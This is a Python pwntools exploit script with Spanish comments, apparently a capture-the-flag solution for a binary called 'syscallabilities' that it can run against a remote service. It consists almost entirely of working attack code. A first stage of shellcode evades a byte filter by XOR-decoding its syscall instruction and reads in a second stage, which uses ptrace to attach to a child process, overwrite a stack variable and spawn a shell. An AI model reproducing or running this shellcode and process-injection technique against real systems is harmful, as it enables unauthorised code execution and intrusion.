from pwn import *

# Establecemos el contexto a amd64:
context.arch = "amd64"

# Según si remoto o local:
if args.REMOTE:
	io = remote("167.235.18.25",10002)
else:
	binary = ELF("./syscallabilities")
	if args.GDB:
		io = gdb.debug(binary.path)
	else:
		io = process(binary.path)

# Definimos algunos valores para facilitar la lectura del shellcode
PTRACE_ATTACH	=		16
PTRACE_DETTACH	=		17
PTRACE_POKEUSER	=		5
PTRACE_GETREGS		=	12

# Los primeros bytes de nuestro shellcode son sobreescritos por
# instrucciones XOR que ponen todos los registros a 0:
#
#unsigned char shellcode_bin[] = {
#  0x31, 0x48, 0xdb, 0x31, 0x48, 0xc0, 0x31, 0x48, 0x48, 0xf6, 0x31, 0x48,
#  0xd2, 0x31, 0x48, 0xc9, 0xe4, 0x31, 0x48, 0xed, 0x31, 0x48, 0xff, 0x31,
#  0x31, 0x4d, 0xc9, 0x31, 0x4d, 0xc0, 0x31, 0x4d, 0x4d, 0xe4, 0x31, 0x4d,
#  0xdb, 0x31, 0x4d, 0xd2, 0x31, 0x4d, 0xed, 0x31
#};
#   0x6dc703330000:	xor    rax,rax
#   0x6dc703330003:	xor    rbx,rbx
#   0x6dc703330006:	xor    rcx,rcx
#   0x6dc703330009:	xor    rdx,rdx
#   0x6dc70333000c:	xor    rsi,rsi
#   0x6dc70333000f:	xor    rdi,rdi
#   0x6dc703330012:	xor    rbp,rbp
#   0x6dc703330015:	xor    rsp,rsp
#   0x6dc703330018:	xor    r8,r8
#   0x6dc70333001b:	xor    r9,r9
#   0x6dc70333001e:	xor    r10,r10
#   0x6dc703330021:	xor    r11,r11
#   0x6dc703330024:	xor    r12,r12
#   0x6dc703330027:	xor    r13,r13
#   0x6dc70333002a:	xor    r14,r14
#	<NUESTRO_SHELLCODE_EMPIEZA_AQUI>
padding = b'A'*45

# Estos son los bytes no permitidos:
# 0x90, 0x0f, 0x05, 0x48

# Alphanumeric shellcode. Ejecutado por el proceso padre
# Este primer stage hace un read(0,&shellcode+0x17,0x100);
first_stage = asm("""
			/* Usaremos rip para obtener la dirección del segmento */
			/* de nuestro shellcode ya que no podemos usar la pila */
			/* Pondremos la dirección justo después de la llamada a */
			/* syscall sobre r14, y mediante xchgr sobre rsi :*/
            _set_buffer_rsi:
                 lea r14, [rip + 0x28]
				 xchg r14,rsi
            /* Establecemos el tamaño a leer en edx usando la referencia
				a registros de 32 bits, y nos ahorramos el prefijo 0x48*/
            _set_size_rdx:
                mov edx, 0x200
			/* Ponemos la clave XOR sobre eax, usando la misma técnica
				que para edx: */
            _set_xor_key:
                mov eax, 0x30303030
			/* Arreglamos la pila */
			_fix_stack_rsp:
				lea r14, [rip + 0x400]
				xchg rsp,r14
			/* La petición a PTRACE_GETREGS almacenará los registros aquí: */
			_set_user_regs_buffer:
				lea r9, [rip + 0x800]
            /* Para decodificar los bytes de syscall \x0f\x05, usamos simplemente */
            /* un XOR de los bytes codificados con la clave 0x30303030 */
            _decode_syscall:
                xor dword ptr [rip], eax
            /* Finalmente, los 4 bytes xoreados:*/
            _syscall_encoded:
            """)

# Acabamos de añadir 4 bytes codificados (para sycall y 2 bytes de relleno)
#   nop		    	// nop!
#   xchg eax,ebx    // eax=0;ebx=0x30303030; ahora rax=0 syscall read.
#   syscall         // read(0,[rsi],0x100)
first_stage += b'\xa0\xa3\x3f\x35'
exploit = padding + first_stage
info("[*] First stage shellcode: %s, len=%d", exploit, len(exploit))

# Second stage, ya sin restricciones, debe ser capaz de usar ptrace()
# para sobreescribir una variable en el stack del hijo y ponerla != 0x0.
# El hijo, entonces, ejecutará /bin/sh y obtendremos una shell.
#   0x558c9dc2162d <main+95>        cmp    DWORD PTR [rbp-0x2c], 0x0
#   0x558c9dc21631 <main+99>        je     0x558c9dc2163d <main+111>
#   0x558c9dc21633 <main+101>       mov    eax, 0x0
#   0x558c9dc21638 <main+106>       call   0x558c9dc213ee <present>
#
# En el lado del padre, tenemos el PID del hijo sobre r15:
# r15            0x26db              0x26db
# !rax2 0x26db
# 9947

# Hacemos un attach al proceso hijo, esperamos:
second_stage	=	asm(shellcraft.linux.ptrace(PTRACE_ATTACH,'r15',0,0))
second_stage	+=	asm(shellcraft.wait4('r15',0,0,0))

# En este punto, el proceso hijo estará parado (SIG_STOP)
# Obtenemos sus registros sobre la dirección apuntada por r9:
second_stage	+=	asm(shellcraft.linux.ptrace(PTRACE_GETREGS,'r15',0,'r9'))

# Ahora tenemos los registros del proceso hijo sobre [r9]. Observando lo que nos
# retorna mediante GDB, vemos que el registro rsp se encuentra en user_regs+0x98.
# Guardamos este valor sobre r14. Sabemos que la variable está a 0x14 respecto
# a rsp. Así que:
second_stage	+=	asm("""
						/* Guardamos RSP del hijo sobre r14 */
						mov r13,QWORD PTR [r9+0x98];
						/* La variable a sobreescribir está a 0x14 bytes desde RSP */
						lea r13, [r13-0x14]
						lea r13, [r13 + 0xe8]
						/* Ponemos el valor a sobreescribir sobre [r9] : */
						/* Con un 0x1 tendríamos de sobras, pero qué más da XD */
						mov r12, 0xcafebabe
						mov [r9], r12
					""")

# Ahora sobreescribimos la variable sobre el hijo con cualquier valor !=0:
second_stage	+= 	asm(shellcraft.ptrace(PTRACE_POKEUSER, 'r15', 'r13','r9'))

# Hacemos un dettach; el proceso continuará su ejecución, cuando regrese del nanosleep
# nos ejecutará la llamada a present(); y nos abrirá una shell:
second_stage	+=	asm(shellcraft.linux.ptrace(PTRACE_DETTACH,'r15',0,0))
second_stage	+=	asm(shellcraft.wait4('r15',0,0,0))
info("Second stage payload: %s, %d", second_stage.hex(), len(second_stage))

a = input("GDB")

# Mandamos el first stage shellcode (alfanumérico):
io.sendafter(" now > ", exploit)

# Ahora el binario está en "read()", mientras el hijo sigue su vida. Lanzamos
# el segundo stage, nos retornará una shell:
io.send(second_stage)
io.interactive()
io.close()

sys.exit(0)
